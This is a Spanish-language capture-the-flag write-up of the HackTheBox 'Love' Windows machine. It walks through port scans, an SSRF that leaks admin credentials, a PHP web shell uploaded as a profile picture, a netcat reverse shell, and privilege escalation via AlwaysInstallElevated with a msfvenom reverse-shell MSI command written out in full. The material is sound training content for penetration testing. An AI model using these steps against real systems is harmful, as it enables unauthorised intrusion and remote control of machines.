@@ -1,0 +1,242 @@
+I"52<p>Love es una máquina Windows de nivel fácil en la que tendremos que explotar un SSRF para conseguir credenciales para iniciar sesión como administrador, subir una shell en PHP
+e instalar un binario para ser NT AUTHORITY\SYSTEM.</p>
+
+<p>Como siempre, empezamos escaneando puertos para saber por donde ir para atacar:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.91 scan initiated Fri Aug  6 11:59:13 2021 as: nmap -p- --open -sS --min-rate 5000 -n -v -Pn -oG ports -oN ports.nmap 10.10.10.239
+Nmap scan report for 10.10.10.239
+Host is up (0.16s latency).
+Not shown: 54285 closed ports, 11231 filtered ports
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+3306/tcp  open  mysql
+5000/tcp  open  upnp
+5040/tcp  open  unknown
+5985/tcp  open  wsman
+5986/tcp  open  wsmans
+7680/tcp  open  pando-pub
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Fri Aug  6 12:00:05 2021 -- 1 IP address (1 host up) scanned in 52.20 seconds
+</code></pre></div></div>
+<table>
+    <tr>
+        <td>Puerto</td>
+        <td>    Servicio</td>
+    </tr>
+    <tr>
+        <td>80</td>
+        <td>HTTP - aloja una página web  </td>
+    </tr>
+    <tr>
+        <td>135</td>
+        <td>msrpc - nos podríamos conectar con rpcclient para enumerar usuarios</td>
+    </tr>
+    <tr>
+        <td>443</td>
+        <td>HTTPS - como HTTP pero más seguro</td>
+    </tr>
+    <tr>
+        <td>445</td>
+        <td>SMB - para acceder a recursos compartidos del sistema con smbclient</td>
+    </tr>
+    <tr>
+        <td>3306</td>
+        <td>MySQL - una base de datos en la que pueden haber contraseñas </td>
+    </tr>
+    <tr>
+        <td>47001</td>
+        <td>WinRM - sirve para administrar el sistema de forma remota, nos podríamos conectar con evil-winRM con credenciales válidas</td>
+    </tr>
+</table>
+
+<p>He decidido no poner el resto de puertos ya que no vamos a hacer nada con ellos ni he encontrado una explicación que me guste, y no me gusta extenderme de más.</p>
+
+<p>Tras ver qué puertos están abiertos hacemos un escaneo exhaustivo de estos con -sC y -sV para ver la versión y servicio que corren y usar unos scripts básicos de enumeración:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.91 scan initiated Fri Aug  6 12:01:14 2021 as: nmap -sC -sV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,
+49667,49668,49669,49670 -oN targeted 10.10.10.239
+Nmap scan report for 10.10.10.239
+Host is up (0.36s latency).
+
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
+| Not valid before: 2021-01-18T14:00:16
+|_Not valid after:  2022-01-18T14:00:16
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+3306/tcp  open  mysql?
+| fingerprint-strings: 
+|   LDAPBindReq, LPDString, TLSSessionReq, afp: 
+|_    Host '10.10.14.137' is not allowed to connect to this MariaDB server
+5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+5040/tcp  open  unknown
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+| ssl-cert: Subject: commonName=LOVE
+| Subject Alternative Name: DNS:LOVE, DNS:Love
+| Not valid before: 2021-04-11T14:39:19
+|_Not valid after:  2024-04-10T14:39:19
+|_ssl-date: 2021-08-06T16:25:59+00:00; +21m35s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+7680/tcp  open  pando-pub?
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V=7.91%I=7%D=8/6%Time=610D5CDC%P=x86_64-pc-linux-gnu%r(TLS
+SF:SessionReq,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.137'\x20is\x20not
+SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LPD
+SF:String,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.137'\x20is\x20not\x20
+SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPBin
+SF:dReq,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.137'\x20is\x20not\x20al
+SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(afp,4B,"G
+SF:\0\0\x01\xffj\x04Host\x20'10\.10\.14\.137'\x20is\x20not\x20allowed\x20t
+SF:o\x20connect\x20to\x20this\x20MariaDB\x20server");
+Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h06m36s, deviation: 3h30m03s, median: 21m34s
+| smb-os-discovery: 
+|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: Love
+|   NetBIOS computer name: LOVE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-08-06T09:25:41-07:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-08-06T16:25:48
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Aug  6 12:04:27 2021 -- 1 IP address (1 host up) scanned in 192.89 seconds
+</code></pre></div></div>
+
+<p>Haciendo un escaneo de la versión y el servicio que corre cada uno de estos puertos nos encontramos un subdominio y 3 puertos que corren una página web, a ver qué será eso. Agregamos <code class="language-plaintext highlighter-rouge">love.htb</code> y <code class="language-plaintext highlighter-rouge">staging.love.htb</code> al /etc/hosts y entramos a Faaaaaairfox a ver qué es qué.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/128548460-fa9a5463-ef23-4664-973a-2fdc26ea24df.png" alt="imagen" /></p>
+
+<p>Si entramos a love.htb nos encontramos un panel de inicio de sesión con el que no vamos a hacer nada de momento, así que vamos a mirar los demás puertos.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/128548619-8c838255-39d3-46b3-b294-5f68bbdf0475.png" alt="imagen" /></p>
+
+<p>Entramos a staging.love.htb(o https://10.10.10.239) y nos encontramos esto, que tiene mejor pinta, volveremos tras ver que hay en el puerto 5000.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/128548702-59561f22-9593-410c-a901-c2e72080ea82.png" alt="imagen" /></p>
+
+<p>:/
+Pues vamos a volver al HTTPS.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/128548855-9ecd1cac-334a-4b9a-9c21-f002e3a73736.png" alt="imagen" /></p>
+
+<p>Si le damos al apartado de demo nos lleva a esto, que nos pide una URL, pero qué pasa si le ponemos el puerto 5000, que desde fuera esta prohibido? 
+No hay que escribir la IP de la máquina, si no localhost, ya que estamos pidiendo algo de la misma máquina.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/128549076-33a3b327-2a4d-41d2-b06c-48514ec1f542.png" alt="imagen" /></p>
+
+<p>BUENOOOOOOOOOOOO, unas credenciales. Creo que todos sabemos para qué es esto, así que volvamos a love.htb(Puerto 80), y como dice admin tiene que haber un /admin.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/128571884-33d1f0b2-bb42-4c47-a2da-ca7a0bee2ee9.png" alt="imagen" /></p>
+
+<p>Efectivamente, estamos dentro.
+Buscando por la dashboard no encontramos nada de utilidad, pero podemos cambiar la foto de perfil de nuestro usuario, y ¿qué pasaría si en vez de un .jpg le metemos una shell en PHP como esta?</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/128572164-71d6556d-8e70-491a-9ef0-d8fd0bfd48ea.png" alt="imagen" /></p>
+
+<p>Pues que nos deja sin problema.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/128572281-beb15c21-fd8f-476b-9988-a99c60246a90.png" alt="imagen" /></p>
+
+<p>Entonces vamos a /images/rce.php(el nombre de mi archivo) y con el parámetro cmd le pasamos un comando a nivel de sistema:</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/128572413-ecc9ac31-9ca9-48c1-8935-ea0e893bec9d.png" alt="imagen" /></p>
+
+<p>Yyyy ahí está :D. Verifiqué si tenía cURL y en efecto, lo tenía, así que lo aproveché para colar un nc.exe y entablarme una reverse shell.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/128572646-f3e83e62-b746-44f5-9bc4-826382b6174c.png" alt="imagen" /></p>
+
+<p>La máquina ha hecho una petición GET a mi máquina solicitando nc.exe, y con -o lo he guardado a nc.exe, ahora solo falta ejecutarlo y enviarme una shell. Usando el nc 
+que pasé antes me he enviado un cmd.exe con el parámetro -e a mi IP por el puerto 6969(nice.)</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/128572897-f219c461-8633-4b3c-83fd-ea2f55e82ff1.png" alt="imagen" /></p>
+
+<p>Bueno, somos phoebe, si vemos qué privilegios tenemos con <code class="language-plaintext highlighter-rouge">whoami /priv</code> tenemos:</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/128575730-5b80b53e-6180-46f6-94e3-f441a7795782.png" alt="imagen" /></p>
+
+<p>Pero, ¿y si vemos el registro a ver si tenemos AlwaysInstallElevated?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+</code></pre></div></div>
+
+<p>Está puesto en 1, que significa True, así que podemos generar un binario malicioso que envíe una shell a mi máquina como root con <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.137 LPORT=42069 -f msi -o reverse.msi
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of msi file: 159744 bytes
+Saved as: reverse.msi
+</code></pre></div></div>
+
+<p>Ahora solo faltaría crear un servidor HTTP con python, descargarlo en la máquina y escuchar con netcat.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/128576105-95b02d26-f3d1-4c3a-95d6-77064eff3e96.png" alt="imagen" /></p>
+
+<p>Ahí recibimos la petición GET, ahora hay que ejecutarlo escribiendo el nombre del archivo y escuchar con nc por el puerto que hayas introducido en LPORT al crear el 
+payload.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/128576255-2cae797b-fb8b-4498-9e8c-dc5e1a843907.png" alt="imagen" /></p>
+
+<p>Ahí estáaaaaa, ahora hay que dirigirse a C:\Users\Administrator\Desktop y leer root.txt con <code class="language-plaintext highlighter-rouge">type root.txt</code>.</p>
+
+<p>Ha sido una máquina bastante divertida, me ha gustado bastante la parte del user, pero no tanto la privesc. Hasta aquí la máquina, el siguiente sábado haré otro writeup(si soy capaz de hacer la máquina :p)</p>
+
+<p>Y recuerda, aguante Metasploit ;)</p>
+
+:ET
